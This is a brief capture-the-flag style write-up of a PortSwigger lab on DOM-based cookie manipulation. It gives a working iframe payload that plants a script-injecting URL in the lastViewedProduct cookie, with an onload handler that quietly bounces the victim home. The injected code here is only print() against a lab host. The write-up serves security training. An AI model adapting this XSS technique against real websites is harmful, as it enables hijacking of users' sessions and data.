# Lab 07 — DOM-based cookie manipulation

> **Practitioner** · [Official lab](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)

**Entry point:** the client stores `lastViewedProduct` (a URL) in a cookie
and later injects it into the page.

## Solution

1. Poison the cookie via an iframe whose src is a product URL plus a
   script payload:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>"
        onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
</iframe>
```

2. Deliver to victim — the first load saves the malicious URL in
   `lastViewedProduct`; the `onload` immediately bounces them home, unaware.
3. Next time the victim loads the home page, the cookie value is injected —
   `print()` executes — lab solved.

## Notes

Client-side cookies written from URLs are stored XSS payloads waiting for
the next render.
